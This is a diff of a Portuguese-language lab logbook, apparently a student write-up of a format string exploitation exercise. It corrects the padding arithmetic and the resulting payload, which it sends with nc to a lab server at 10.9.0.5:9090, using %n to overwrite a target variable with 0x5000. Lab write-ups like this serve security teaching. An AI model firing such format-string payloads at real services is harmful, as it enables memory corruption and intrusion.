@@ -95,12 +95,12 @@ Verificou-se que o valor de `target` foi alterado para `0x000001fd` (509 em deci
 
 ### Task 3.B: Change the value to 0x5000
 
-Para alterar o valor de `target` para 0x5000 (20480 em decimal), teremos que escrever 20480 caracteres antes de `%n`. Sendo que o endereço já ocupa 4 bytes e precisamos de 63 `%08x` para avançar o va_list pointer, ainda precisamos de 20480 - 4 - 63 x 8 = 19972 caracteres.
+Para alterar o valor de `target` para 0x5000 (20480 em decimal), teremos que escrever 20480 caracteres antes de `%n`. Sendo que o endereço já ocupa 4 bytes e precisamos de 62 `%08x` para avançar o va_list pointer, ainda precisamos de 20480 - 4 - 62 x 8 = 19980 caracteres.
 
-Assim, precisamos de `%.19972x` antes de `%n`:
+Assim, precisamos de `%.19980x` antes de `%n`:
 
 ```bash
-echo echo "\x08\x40\x0b\x08%.19972x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x %n" | nc 10.9.0.5 9090
+echo echo "\x08\x40\x0b\x08%.19980x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x %n" | nc 10.9.0.5 9090
 ```
 
 <img src="../screenshots/logbook7/task3.B.png" alt="taskB.A">
